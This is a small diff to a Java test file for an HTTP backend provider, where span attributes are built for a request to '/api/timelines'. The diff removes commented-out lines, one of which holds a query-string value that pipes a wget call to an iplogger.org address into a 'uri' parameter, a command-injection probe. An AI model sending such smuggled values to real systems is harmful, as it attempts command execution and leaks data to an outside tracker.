@@ -530,10 +530,6 @@ public class HttpBackendProviderTest {
                             AttributeValue.newBuilder().setValue("dataservice:9394").build(),
                             RawSpanConstants.getValue(HTTP_PATH),
                             AttributeValue.newBuilder().setValue("/api/timelines").build(),
-                            //
-                            // RawSpanConstants.getValue(HTTP_REQUEST_QUERY_STRING),
-                            //
-                            // AttributeValue.newBuilder().setValue("uri=|%20wget%20https://iplogger.org/1pzQq").build(),
                             "http.response.header.x-envoy-upstream-service-time",
                             AttributeValue.newBuilder().setValue("11").build(),
                             "http.response.header.x-forwarded-proto",
